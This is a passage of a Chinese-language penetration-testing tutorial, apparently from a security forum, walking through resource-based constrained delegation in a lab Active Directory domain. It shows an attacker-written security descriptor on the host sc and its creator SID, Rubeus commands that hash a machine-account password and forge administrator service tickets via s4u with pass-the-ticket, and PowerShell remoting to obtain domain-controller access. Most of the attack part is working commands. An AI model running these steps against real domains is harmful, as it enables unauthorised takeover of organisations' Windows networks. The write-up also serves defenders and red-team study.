[https://docs.microsoft.com/zh-cn/sysinternals/downloads/adexplorer](https://docs.microsoft.com/zh-cn/sysinternals/downloads/adexplorer)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be6d9bb2-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be6d9bb2-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be842bb6-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be842bb6-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be9572f4-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121822-be9572f4-491b-1.png)

这里是修改 sc 主机的值，这里的值为 O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;test 的 SID)，同样的也设置好了基于资源的约束委派。

同时我们可以查看机器账户 sc 的创建者，查看 mS-DS-CreatorSID 属性，sc 机器是由 sc 域账户加入，所以显示是 sc 创建的。所以对其有修改权限。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bea94658-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bea94658-491b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-beb9d07c-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-beb9d07c-491b-1.png)

#### 获取票据

计算机器账户 test 的 hash

```
Rubeus.exe hash /user:test$ /password:2313root! /domain:alanlitl.com


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bec9f74a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bec9f74a-491b-1.png)

利用 rubeus 获取票据

这里是利用 winrm 以域管身份访问主机，当然也可以申请 cifs 服务票据。

```
Rubeus.exe s4u /user:test$ /rc4:810445CB03214D4B609BF0236836D093 /impersonateuser:administrator /msdsspn:http/sc.alanlitl.com /ptt
Rubeus.exe s4u /user:test$ /rc4:810445CB03214D4B609BF0236836D093 /impersonateuser:administrator /msdsspn:wsman/sc.alanlitl.com /ptt


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bedcd13a-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-bedcd13a-491b-1.png)

使用 powershell 连接，获取域控权限。

```
New-PSSession -Name Priv -ComputerName sc.alanlitl.com
Enter-PSSession -Name Priv


```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-beeeabda-491b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20221011121823-beeeabda-491b-1.png)